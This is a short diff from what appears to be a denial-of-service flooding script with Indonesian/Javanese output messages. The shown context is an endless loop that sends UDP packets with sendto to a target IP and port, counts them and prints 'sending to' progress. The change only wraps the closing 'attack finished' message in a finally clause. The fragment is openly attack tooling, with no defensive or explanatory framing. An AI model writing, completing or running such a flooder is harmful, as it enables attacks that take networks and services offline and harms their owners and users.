@@ -71,5 +71,5 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         print("\033[37m[IDRIB] \033[32m%s  \033[33m[Ngirim ke]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
-        
-print("\033[92mSerangan wes Rampung\033[0m")
+    finally:    
+        print("\033[92mSerangan wes Rampung\033[0m")
